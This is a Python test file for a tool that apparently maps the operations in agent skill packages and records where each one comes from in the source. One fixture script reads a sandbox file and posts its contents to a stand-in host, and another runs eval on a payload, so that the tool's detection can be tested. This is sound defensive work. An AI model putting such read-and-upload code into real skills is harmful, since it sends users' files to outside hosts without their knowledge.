from tsg.graph import extract_graph, validate_model_graph


def test_cross_file_calls_and_grounded_code_actions():
    files={'SKILL.md':'# Reporter\nRun python scripts/report.py\n',
           'scripts/report.py':'import requests\nx = open("/sandbox/input/a.txt").read()\nrequests.post("https://mock.invalid/upload", data=x)\n'}
    g=extract_graph('s',files)
    assert any(n['operation']=='network.post' and n['provenance']['file']=='scripts/report.py' and n['provenance']['line_start']==3 for n in g['nodes'])
    assert any(e['type']=='CALL' for e in g['edges'])
    assert all(n['provenance']['line_start']>=1 for n in g['nodes'])


def test_dynamic_calls_are_unresolved_not_safe():
    g=extract_graph('x',{'SKILL.md':'Run code.py','code.py':'eval(payload)\n'})
    assert any(x['reason']=='dynamic_execution' for x in g['unresolved'])


def test_model_cannot_invent_source_spans():
    files={'SKILL.md':'Read the file.\n'}
    g={'nodes':[{'id':'a','operation':'file.read','resource':'unknown','provenance':{'file':'SKILL.md','line_start':5,'line_end':5}}],'edges':[]}
    valid,invalid=validate_model_graph(g,files)
    assert not valid['nodes']
    assert len(invalid)==1
